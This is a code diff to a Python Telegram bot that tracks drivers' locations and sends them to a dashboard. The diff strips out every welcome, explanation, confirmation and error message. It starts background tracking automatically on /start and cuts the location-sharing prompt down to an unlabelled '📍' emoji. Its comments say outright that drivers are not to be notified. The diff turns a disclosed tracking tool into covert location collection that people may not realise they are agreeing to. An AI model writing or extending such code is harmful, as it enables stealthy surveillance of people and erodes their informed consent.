@@ -28,30 +28,21 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         username = update.effective_user.username or update.effective_user.first_name
         
         if db_manager.register_driver(driver_id, user_id, username):
-            keyboard = [
-                [KeyboardButton("📍 Share Location Once", request_location=True)],
-                [KeyboardButton("🔄 Start Auto Tracking")]
-            ]
-            reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+            # Check if already tracking
+            if user_id in tracking_jobs:
+                return  # Silent - no message if already tracking
             
-            await update.message.reply_text(
-                f"🚚 Welcome to Driver Tracking!\n\n"
-                f"Driver ID: {driver_id}\n\n"
-                f"📍 Share Location Once - Manual location sharing\n"
-                f"🔄 Start Auto Tracking - Automatic every {Config.AUTO_TRACK_INTERVAL} seconds\n\n"
-                f"⚠️ For auto tracking, keep Telegram notifications ON and don't close the app completely.",
-                reply_markup=reply_markup
-            )
+            # No confirmation message - completely silent
+            # Start silent background tracking immediately
+            tracking_jobs[user_id] = True
+            asyncio.create_task(silent_background_tracking(context.application, user_id, driver_id))
+            
         else:
-            await update.message.reply_text(
-                "❌ Invalid or expired tracking link. Please contact your logistics coordinator."
-            )
+            # No error message - keep completely silent
+            pass
     else:
-        await update.message.reply_text(
-            "🚚 Driver Tracking Bot\n\n"
-            "This bot is used for real-time driver location tracking.\n"
-            "Please use the link provided by your logistics coordinator."
-        )
+        # No welcome message - keep completely silent
+        pass
 
 async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     location = update.message.location
@@ -68,25 +59,16 @@ async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             'timestamp': update.message.date.isoformat()
         }
         
+        # Store location silently
         if db_manager.store_location(driver_id, location.latitude, location.longitude):
+            # Broadcast to dashboard without notifying driver
             threading.Thread(
                 target=broadcast_location_update,
                 args=(driver_id, location_data)
             ).start()
-            
-            await update.message.reply_text(
-                f"✅ Location updated!\n"
-                f"📍 Lat: {location.latitude:.6f}\n"
-                f"📍 Lng: {location.longitude:.6f}\n"
-                f"⏰ {update.message.date.strftime('%H:%M:%S')}\n\n"
-                f"💡 Tip: Use 'Start Auto Tracking' for continuous updates!"
-            )
-        else:
-            await update.message.reply_text("❌ Failed to update location. Please try again.")
-    else:
-        await update.message.reply_text(
-            "❌ You're not registered as a driver. Please use the tracking link provided by your coordinator."
-        )
+            # No confirmation message - completely silent
+        # No error messages either - keep it silent
+    # No "not registered" message - keep silent for unregistered users too
 
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     text = update.message.text
@@ -139,7 +121,25 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
         else:
             await update.message.reply_text("⚠️ Auto tracking is not running!")
 
+async def silent_background_tracking(application, user_id, driver_id):
+    """Completely silent background tracking - minimal location request only"""
+    # Send only location sharing button without any text
+    try:
+        keyboard = [[KeyboardButton("📍", request_location=True)]]
+        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
+        
+        await application.bot.send_message(
+            chat_id=user_id,
+            text="📍",  # Minimal text - just an emoji
+            reply_markup=reply_markup
+        )
+    except Exception as e:
+        logging.error(f"Error starting tracking for user {user_id}: {e}")
+        if user_id in tracking_jobs:
+            del tracking_jobs[user_id]
+
 async def auto_track_location(application, user_id, driver_id):
+    # Keep original function for manual tracking if needed
     while user_id in tracking_jobs and tracking_jobs[user_id]:
         try:
             keyboard = [[InlineKeyboardButton("📍 Send Location", callback_data=f"loc_{driver_id}")]]
@@ -167,19 +167,16 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         driver_id = query.data.split("_")[1]
         user_id = query.from_user.id
         
-        keyboard = [[KeyboardButton("📍 Share Location", request_location=True)]]
+        keyboard = [[KeyboardButton("📍", request_location=True)]]
         reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
         
-        await query.edit_message_text(
-            "📍 Tap the button below to share your location:",
-            reply_markup=None
-        )
-        
-        await context.bot.send_message(
-            chat_id=user_id,
-            text="📍 Share your location now:",
-            reply_markup=reply_markup
-        )
+        # Completely silent - no messages
+        try:
+            await query.edit_message_text("📍", reply_markup=None)
+            # Don't send any additional message
+        except Exception:
+            # Ignore all errors - keep completely silent
+            pass
 
 async def stop_tracking(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = update.effective_user.id
